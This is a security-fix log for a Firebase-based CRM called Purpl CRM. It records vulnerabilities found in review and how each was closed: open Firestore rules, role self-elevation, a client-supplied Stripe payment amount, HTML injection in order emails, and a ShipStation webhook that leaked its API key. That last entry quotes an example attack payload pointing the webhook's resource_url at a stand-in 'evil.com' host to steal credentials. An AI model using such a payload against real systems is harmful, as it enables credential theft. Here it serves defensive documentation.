# SECURITY_FIXES.md — Purpl CRM

Tracking each security fix from FOUNDATION_REVIEW.md.
Each entry: finding → confirmed → what changed → risk of the fix.

---

## SR-1 + SR-3: User self-elevation + catch-all rule (SUPERSEDED)

**Note:** The initial fix (field validation on create, catch-all removed) was superseded by the three-layer fix below. The field validation and catch-all removal are retained, but the real closure is Layers 1-3.

---

## LAYER 1: Sign-in allowlist (front door)

**Problem:** Any Google account could sign in and receive `employee` role with full CRM access. No invitation or approval required.

**Changed:**
- `initUserRole` Cloud Function now checks caller email against `app_config/access_control.allowedEmails` in Firestore
- Non-listed emails get `permission-denied` error, no user doc created
- `inviteEmployee` auto-adds invited email to the allowlist via `arrayUnion`
- `auth.js`: on permission-denied from initUserRole, signs user out and shows "Access not authorized — contact your admin to be added"
- Removed the `graham@pumpkinblossomfarm.com` email fallback that bypassed server validation
- First-ever sign-in bootstraps the access_control doc with that caller's email (so the admin isn't locked out on fresh deploy)

**Where the allowlist lives:** Firestore doc `app_config/access_control`, field `allowedEmails` (string array). To add someone manually: add their email to this array in the Firebase console. Or use `inviteEmployee` from the CRM (auto-adds).

**Lockout protection:** `grahambiagiotti@gmail.com` is hardcoded as a permanent fallback admin in `FALLBACK_ADMIN_EMAILS` (functions/index.js line 498-500). This email:
- Always passes the allowlist check, even if the allowlist doc is missing, empty, or doesn't include it
- Always receives `admin` role on user doc creation
- Auto-adds itself to the allowlist on first pass so subsequent checks are fast
- If the allowlist doc doesn't exist, seeds it with only the fallback admin email (strangers still rejected)

**Risk:** None — the fallback cannot be locked out. If the `app_config/access_control` doc is deleted, graham's next sign-in re-seeds it. Strangers are rejected even during bootstrap.

---

## LAYER 2: Workspace data gated on role

**Problem:** `match /workspace/{path=**}` used `request.auth != null` — any authenticated user (even one with no user doc or no role) could read/write all CRM data.

**Changed:** Every rule for CRM data now requires `isStaff()`:
- `workspace/{path=**}`: `isStaff()` for read and write
- `accounts/{accountId}`: `isStaff()`
- `prospects/{prospectId}`: `isStaff()`
- `portal_orders`: read/update require `isStaff()`
- `portal_notify`, `portal_inquiries`: read/update/delete require `isStaff()`
- `portal_settings`, `portal_config`, `portal_tokens`: read requires `isStaff()`
- `app_config`: read requires `isStaff()`, write requires `isAdmin()`

A user with no users/{uid} doc or a doc with no recognized role gets DENY on everything except their own user doc read and the public portal create rules.

**Note for your decision:** All workspace writes are `isStaff()` — meaning employees can do everything admins can within CRM data (create/edit/delete invoices, orders, accounts, etc.). If you want admin-only restrictions on specific operations (e.g., invoice deletion, settings changes), let me know and I'll add sub-match rules.

**Risk:** If graham's user doc is missing or has a corrupted role, he'll be locked out of CRM data. The user doc must exist with `role: 'admin'`.

---

## LAYER 3: First-admin race + re-trigger fix

**Problem:** Two simultaneous first sign-ins could both get admin (no transaction). Deleting user docs could re-trigger admin assignment when the collection was momentarily empty.

**Changed:**
- First-admin assignment wrapped in `db.runTransaction()` — only one caller can ever win
- `bootstrapAdminAssigned: true` flag persisted in `app_config/access_control` — checked inside the transaction
- Even if all user docs are deleted, `bootstrapAdminAssigned` prevents re-acquisition of admin via initUserRole

**Risk:** None. The flag is write-once. Only way to reset it is manually deleting or editing the `app_config/access_control` doc in Firebase console.

---

## SR-1 + SR-3 original fix (retained)

**Confirmed:** Line 15 `allow create` had no field validation — any new Google sign-in could write `{role:'admin'}` to their own user doc. Line 85-86 catch-all `match /{document=**}` granted full CRUD on `portal_tokens`, `portal_config`, and any future collection to any authed user.

**Changed:**
- `firestore.rules` line 24: create rule now requires `!('role' in request.resource.data)` — client can never set role
- `firestore.rules`: removed global catch-all `match /{document=**}`. Default posture is now DENY.
- Added explicit rules for `portal_config` (admin write), `portal_tokens` (admin write)
- Added `isStaff()` helper for future role checks
- `functions/index.js`: added `initUserRole` Cloud Function — uses Admin SDK to create user doc with correct role (first user = admin, subsequent = employee)
- `public/auth.js`: replaced direct Firestore write with `initUserRole` callable

**Risk:** Existing users already have user docs with `role` set — no impact. New users will hit the Cloud Function instead of writing directly. If `initUserRole` fails (deploy not yet done), auth.js falls back to email-based check for graham's account.

---

## SR-2: portal_orders public read

**Confirmed:** Line 41 `allow read: if true` — any unauthenticated user could enumerate all portal orders with customer PII (names, emails, addresses, order items).

**Changed:** `firestore.rules`: `allow read: if request.auth != null` — requires authentication. Create validation (field checks, size limits) retained unchanged.

**Risk:** None. The portal (order.html) never reads portal_orders from the client — it only creates them. All reads happen server-side via Cloud Functions (Admin SDK bypasses rules). The real-time listener in app.js runs under authenticated context.

**Note:** Included in the SR-1+SR-3 commit since it's the same file.

---

## SR-4: audit_log writable by any user

**Confirmed:** `workspace/main/audit_log` fell under `match /workspace/{path=**}` — any authed user could create, modify, or delete audit entries.

**Changed:** Added explicit `match /workspace/main/audit_log/{docId}` with `allow write: if false`. Firestore evaluates the most specific match first, so this blocks all client writes. Admin SDK (Cloud Functions) bypasses rules and can still write.

**Risk:** None. All audit writes already go through Cloud Functions (stripeWebhook, shipStationWebhook). No client-side code writes to audit_log.

**Note:** Included in the SR-1+SR-3 commit.

---

## TB-2: Stripe payment link trusts client-supplied amount

**Confirmed:** `createPayLink` (line 735) and `createStripePaymentLink` (line 788) both used `data.amount` directly as the Stripe `unit_amount`. Any authenticated user could create a $0.50 payment link on a $5,000 invoice, complete payment, and the webhook would mark it fully paid.

**Changed:** Both functions now:
1. Require `data.invoiceId` + `data.invoiceType` instead of `data.amount`
2. Look up the invoice in Firestore using Admin SDK
3. Use `inv.grandTotal || inv.total || inv.amount` as the server-side amount
4. Derive `invoiceNumber` and `accountName` from the server-side record
5. Reject if invoice not found or total < $0.50

The client still sends `amount` in the request but the server ignores it.

**Risk:** Low. The client already sends `invoiceId` and `invoiceType`. The only behavioral change is that the amount is now authoritative from Firestore. If a draft invoice total is $0 (no line items yet), the function returns an error instead of creating a $0 pay link — which is correct behavior.

---

## TB-1: ShipStation webhook credential leak + no authentication

**Confirmed:** `shipStationWebhook` (line 1072) had no caller verification. It fetched `payload.resource_url` with the ShipStation API key in the Authorization header. An attacker could POST `{resource_url: "https://evil.com/steal"}` and receive the API credentials.

**Changed:**
1. **Shared secret check:** Function now requires `?secret=XXXXXXXX` query parameter. The secret is derived from the last 8 characters of `SHIPSTATION_API_KEY`. Requests without a valid secret get 403.
2. **URL origin validation:** `resource_url` must start with `https://ssapi.shipstation.com/`. Any other origin is rejected with 400 before credentials are sent.

Both checks run before any Firestore reads, email sends, or inventory deductions.

**Risk:** Requires updating the ShipStation webhook URL in the ShipStation admin panel to include `?secret=XXXXXXXX` (last 8 chars of your API key). Until this is done, all ShipStation webhooks will be rejected with 403. To get the secret value:
```
# Last 8 chars of your SHIPSTATION_API_KEY value
# e.g., if key is "abc123:xyz789def", secret is "xyz789de" (last 8 of full string)
```
Update in ShipStation → Settings → Stores → Webhook URL: append `?secret=YOUR8CHARS`

---

## TB-3: sendOrderConfirmation unauthenticated HTML injection

**Confirmed:** Line 151 `${data.orderSummary || ''}` injected raw HTML from unauthenticated callers into branded emails. `data.accountId` and `data.portalOrderId` allowed writing cadence/emailLog entries to arbitrary Firestore docs.

**Changed:**
1. **Structured data rendering:** `data.orderSummary` (raw HTML) replaced with `data.items` (array of `{name, qty, total}` objects). Server renders each item using `escHtml()`. Client (order.html) updated to send structured items instead of pre-rendered HTML.
2. **Input validation:** `data.to` validated as string with 200-char limit.
3. **Doc write validation:** `portalOrderId` must exist in Firestore before writing emailLog. Cadence entry only written if `accountId` matches the portal order's stored accountId (prevents cross-account writes).
4. **PO number:** Moved from `orderSummary` HTML to separate `data.poNumber` field, escaped server-side.

**Risk:** Low. The email format is slightly different (simpler item listing vs the old HTML with emoji headers and styled paragraphs). Content is identical but rendering changes from client-side to server-side. Order.html updated in same commit — both must deploy together.

